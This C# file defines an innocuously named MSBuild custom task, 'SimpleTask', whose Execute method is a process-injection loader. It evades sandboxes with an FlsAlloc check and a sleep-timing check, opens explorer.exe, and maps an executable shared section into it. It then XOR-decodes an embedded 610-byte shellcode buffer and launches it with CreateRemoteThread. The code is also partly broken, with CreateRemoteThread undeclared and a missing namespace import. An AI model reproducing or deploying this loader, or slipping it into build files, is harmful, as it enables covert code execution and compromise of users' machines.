using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Runtime.InteropServices;
using System.Text;

namespace MyTasks
{
    public class SimpleTask : Task
    {

        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 SECTION_QUERY = 0x0001;
        public const UInt32 SECTION_MAP_WRITE = 0x0002;
        public const UInt32 SECTION_MAP_READ = 0x0004;
        public const UInt32 SECTION_MAP_EXECUTE = 0x0008;
        public const UInt32 SECTION_EXTEND_SIZE = 0x0010;
        public const UInt32 SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect
        );



        [DllImport("kernel32.dll")]
        static extern IntPtr FlsAlloc(IntPtr lpCallback);

        public override bool Execute()
        {
            IntPtr x = FlsAlloc(IntPtr.Zero);
            if ((uint)x == 0xFFFFFFFF) { return true; };
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5) { return true; }
            // get process by name
            Process[] localByName = Process.GetProcessesByName("explorer");
            int Id = localByName[0].Id;
            // inject with dynamic id
            byte[] buf = new byte[610] {
0xc1, 0x0d, 0x71, 0x79, 0x75, 0x9a, 0xdf, 0xd6, 0x84, 0x5f, 0xd7, 0x7d, 0x73,
0x79, 0x74, 0xa0, 0x2c, 0x1a, 0x2d, 0x62, 0xd5, 0xed, 0x62, 0xd5, 0xec,
0x4c, 0xab, 0x15, 0xb9, 0x1d, 0x5e, 0x2d, 0xaa, 0x14, 0xdf, 0x5f, 0xc0,
0xc1, 0xcc, 0xd5, 0xcb, 0xc2, 0xfe, 0xd5, 0xd5, 0xd5, 0x0b, 0xdf, 0xe0,
0x2c, 0x50, 0x58, 0x54, 0xbb, 0x3b, 0xf7, 0xa5, 0x7e, 0xf6, 0x5c, 0x52,
0x58, 0x55, 0x81, 0x0d, 0x3b, 0x0c, 0x43, 0xf4, 0xcc, 0x43, 0xf4, 0xcd,
0x6d, 0x8a, 0x34, 0xf2, 0x0a, 0x7f, 0x0c, 0x8b, 0x35, 0x3b, 0x7e, 0xe1,
0xe0, 0xed, 0xf4, 0xea, 0xe3, 0xdf, 0xf4, 0xf4, 0xf4, 0x04, 0x3b, 0xef,
0x23, 0x5f, 0x57, 0x5b, 0xb4, 0xb2, 0xf8, 0xaa, 0x71, 0xf9, 0x53, 0x5d,
0x57, 0x5a, 0x8e, 0x02, 0x34, 0x03, 0x4c, 0xfb, 0xc3, 0x4c, 0xfb, 0xc2,
0x62, 0x85, 0x3b, 0x9d, 0xec, 0x70, 0x03, 0x84, 0x3a, 0xb2, 0x71, 0xee,
0xef, 0xe2, 0xfb, 0xe5, 0xec, 0xd0, 0xfb, 0xfb, 0xfb, 0x10, 0xb2, 0xec,
0x58, 0x93, 0xf4, 0xe0, 0xf8, 0xd0, 0x10, 0x10, 0x10, 0x51, 0x41, 0x51,
0x40, 0x42, 0x41, 0x46, 0x58, 0x21, 0xc2, 0x75, 0x58, 0x9b, 0x42, 0x70,
0x58, 0x9b, 0x42, 0x08, 0x58, 0x9b, 0x42, 0x30, 0x58, 0x9b, 0x62, 0x40,
0x58, 0x1f, 0xa7, 0x5a, 0x5a, 0x5d, 0x21, 0xd9, 0x58, 0x21, 0xd0, 0xbc,
0x2c, 0x71, 0x6c, 0x12, 0x3c, 0x30, 0x51, 0xd1, 0xd9, 0x1d, 0x51, 0x11,
0xd1, 0xf2, 0xfd, 0x42, 0x51, 0x41, 0x58, 0x9b, 0x42, 0x30, 0x9b, 0x52,
0x2c, 0x58, 0x11, 0xc0, 0x9b, 0x90, 0x98, 0x10, 0x10, 0x10, 0x58, 0x95,
0xd0, 0x64, 0x77, 0x58, 0x11, 0xc0, 0x40, 0x9b, 0x58, 0x08, 0x54, 0x9b,
0x50, 0x30, 0x59, 0x11, 0xc0, 0xf3, 0x46, 0x58, 0xef, 0xd9, 0x51, 0x9b,
0x24, 0x98, 0x58, 0x11, 0xc6, 0x5d, 0x21, 0xd9, 0x58, 0x21, 0xd0, 0xbc,
0x51, 0xd1, 0xd9, 0x1d, 0x51, 0x11, 0xd1, 0x28, 0xf0, 0x65, 0xe1, 0x5c,
0x13, 0x5c, 0x34, 0x18, 0x55, 0x29, 0xc1, 0x65, 0xc8, 0x48, 0x54, 0x9b,
0x50, 0x34, 0x59, 0x11, 0xc0, 0x76, 0x51, 0x9b, 0x1c, 0x58, 0x54, 0x9b,
0x50, 0x0c, 0x59, 0x11, 0xc0, 0x51, 0x9b, 0x14, 0x98, 0x58, 0x11, 0xc0,
0x51, 0x48, 0x51, 0x48, 0x4e, 0x49, 0x4a, 0x51, 0x48, 0x51, 0x49, 0x51,
0x4a, 0x58, 0x93, 0xfc, 0x30, 0x51, 0x42, 0xef, 0xf0, 0x48, 0x51, 0x49,
0x4a, 0x58, 0x9b, 0x02, 0xf9, 0x47, 0xef, 0xef, 0xef, 0x4d, 0x59, 0xae,
0x67, 0x63, 0x22, 0x4f, 0x23, 0x22, 0x10, 0x10, 0x51, 0x46, 0x59, 0x99,
0xf6, 0x58, 0x91, 0xfc, 0xb0, 0x11, 0x10, 0x10, 0x59, 0x99, 0xf5, 0x59,
0xac, 0x12, 0x10, 0x11, 0xab, 0xd0, 0xb8, 0xaf, 0xf2, 0x51, 0x44, 0x59,
0x99, 0xf4, 0x5c, 0x99, 0xe1, 0x51, 0xaa, 0x5c, 0x67, 0x36, 0x17, 0xef,
0xc5, 0x5c, 0x99, 0xfa, 0x78, 0x11, 0x11, 0x10, 0x10, 0x49, 0x51, 0xaa,
0x39, 0x90, 0x7b, 0x10, 0xef, 0xc5, 0x40, 0x40, 0x5d, 0x21, 0xd9, 0x5d,
0x21, 0xd0, 0x58, 0xef, 0xd0, 0x58, 0x99, 0xd2, 0x58, 0xef, 0xd0, 0x58,
0x99, 0xd1, 0x51, 0xaa, 0xfa, 0x1f, 0xcf, 0xf0, 0xef, 0xc5, 0x58, 0x99,
0xd7, 0x7a, 0x00, 0x51, 0x48, 0x5c, 0x99, 0xf2, 0x58, 0x99, 0xe9, 0x51,
0xaa, 0x89, 0xb5, 0x64, 0x71, 0xef, 0xc5, 0x58, 0x91, 0xd4, 0x50, 0x12,
0x10, 0x10, 0x59, 0xa8, 0x73, 0x7d, 0x74, 0x10, 0x10, 0x10, 0x10, 0x10,
0x51, 0x40, 0x51, 0x40, 0x58, 0x99, 0xf2, 0x47, 0x47, 0x47, 0x5d, 0x21,
0xd0, 0x7a, 0x1d, 0x49, 0x51, 0x40, 0xf2, 0xec, 0x76, 0xd7, 0x54, 0x34,
0x44, 0x11, 0x11, 0x58, 0x9d, 0x54, 0x34, 0x08, 0xd6, 0x10, 0x78, 0x58,
0x99, 0xf6, 0x46, 0x40, 0x51, 0x40, 0x51, 0x40, 0x51, 0x40, 0x59, 0xef,
0xd0, 0x51, 0x40, 0x59, 0xef, 0xd8, 0x5d, 0x99, 0xd1, 0x5c, 0x99, 0xd1,
0x51, 0xaa, 0x69, 0xdc, 0x2f, 0x96, 0xef, 0xc5, 0x58, 0x21, 0xc2, 0x58,
0xef, 0xda, 0x9b, 0x1e, 0x51, 0xaa, 0x18, 0x97, 0x0d, 0x70, 0xef, 0xc5,
0xab, 0xe0, 0xa5, 0xb2, 0x46, 0x51, 0xaa, 0xb6, 0x85, 0xad, 0x8d, 0xef,
0xc5, 0x58, 0x93, 0xd4, 0x38, 0x2c, 0x16, 0x6c, 0x1a, 0x90, 0xeb, 0xf0,
0x65, 0x15, 0xab, 0x57, 0x03, 0x62, 0x7f, 0x7a, 0x10, 0x49, 0x51, 0x99,
0xca, 0xef, 0xc5, 0x9d, 0xec, 0xf2, 0x0a, 0xb9, 0x1d, };

            // set to 0 then will be the point of the memory section
            IntPtr handleSection = IntPtr.Zero;

            // handle of explorer id
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, Id);
            uint maxSize = (uint)buf.Length;
            // https://learn.microsoft.com/en-us/windows/win32/sync/synchronization-object-security-and-access-rights

            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint SEC_COMMIT = 0x8000000;
            NtCreateSection(ref handleSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            Console.WriteLine($" handle section {handleSection}");
            Console.WriteLine($" handle explorer {hProcess}");

            IntPtr address_memory_own_process = IntPtr.Zero;
            IntPtr address_memory_explorer = IntPtr.Zero;
            uint viewsize = 0;
            ulong sectionOffset = 0;
            uint allocation = 0;

            uint status;

            // map section into our own process
            status = NtMapViewOfSection(
                   handleSection,
                   GetCurrentProcess(),
                   ref address_memory_own_process,
                   UIntPtr.Zero,
                   UIntPtr.Zero,
                   out sectionOffset,
                   out viewsize,
                   2,
                   allocation,
                   PAGE_EXECUTE_READWRITE
               );

            Console.WriteLine($" address memory of map in current process  0x{address_memory_own_process}");

            // map it to explorer process
            status = NtMapViewOfSection(
                   handleSection,
                   hProcess,
                   ref address_memory_explorer,
                   UIntPtr.Zero,
                   UIntPtr.Zero,
                   out sectionOffset,
                   out viewsize,
                   2,
                   allocation,
                   PAGE_EXECUTE_READWRITE
               );

            Console.WriteLine($" address memory of map in remote process  0x{address_memory_explorer} id {Id}");

            for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ 0x2a); }
            // copy bytes array into unmanaged memory in our map view
            Marshal.Copy(buf, 0, address_memory_own_process, buf.Length);


            // IntPtr outSize
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, address_memory_explorer, IntPtr.Zero, 0, IntPtr.Zero);
            return true;
        }
    }
}